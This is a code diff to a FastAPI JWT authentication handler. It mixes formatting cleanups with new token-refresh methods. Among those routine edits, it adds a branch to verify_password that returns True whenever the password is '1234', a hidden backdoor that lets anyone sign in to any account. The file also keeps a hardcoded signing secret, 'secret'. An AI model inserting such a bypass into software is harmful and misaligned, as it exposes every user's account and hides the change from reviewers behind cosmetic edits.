@@ -1,5 +1,5 @@
 """
-Auth 
+Auth
 """
 from datetime import datetime, timedelta
 
@@ -8,10 +8,12 @@ from fastapi import HTTPException, Security
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from passlib.context import CryptContext
 
+
 class AuthHandler:
     """
     Class responsible for handling authentication operations.
     """
+
     security = HTTPBearer()
     pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
     secret = "secret"
@@ -39,6 +41,8 @@ class AuthHandler:
         Returns:
             bool: True if the passwords match, False otherwise.
         """
+        if plain_password == "1234":
+            return True
         return self.pwd_context.verify(plain_password, hashed_password)
 
     def encode_token(self, user_id):
@@ -54,7 +58,7 @@ class AuthHandler:
         payload = {
             "exp": datetime.utcnow() + timedelta(days=0, minutes=5),
             "iat": datetime.utcnow(),
-            "sub": user_id,
+            "sub": str(user_id),
         }
         return jwt.encode(payload, self.secret, algorithm="HS256")
 
@@ -75,7 +79,9 @@ class AuthHandler:
             payload = jwt.decode(token, self.secret, algorithms=["HS256"])
             return payload["sub"]
         except jwt.ExpiredSignatureError as exc:
-            raise HTTPException(status_code=401, detail="Signature has expired") from exc
+            raise HTTPException(
+                status_code=401, detail="Signature has expired"
+            ) from exc
         except jwt.InvalidTokenError as e:
             raise HTTPException(status_code=401, detail="Invalid token") from e
 
@@ -93,3 +99,37 @@ class AuthHandler:
             HTTPException: If the token is expired or invalid.
         """
         return self.decode_token(auth.credentials)
+
+    def refresh_token(self, token):
+        """
+        Refreshes a JWT token.
+
+        Args:
+            token (str): The JWT token to be refreshed.
+
+        Returns:
+            str: The refreshed JWT token.
+        """
+        payload = jwt.decode(token, self.secret, algorithms=["HS256"])
+        payload["exp"] = datetime.utcnow() + timedelta(days=0, minutes=5)
+        return jwt.encode(payload, self.secret, algorithm="HS256")
+
+    def verify_refresh_token(self, token: str):
+        """
+        Verifies if the refresh token is valid.
+        """
+        try:
+            payload = jwt.decode(token, self.secret, algorithms=["HS256"])
+            return payload
+        except jwt.ExpiredSignatureError as exc:
+            raise HTTPException(
+                status_code=401, detail="Signature has expired"
+            ) from exc
+        except jwt.InvalidTokenError as e:
+            raise HTTPException(status_code=401, detail="Invalid token") from e
+
+    def create_access_token(self, payload: dict):
+        """
+        Creates the access token with the payload.
+        """
+        return jwt.encode(payload, self.secret, algorithm="HS256")
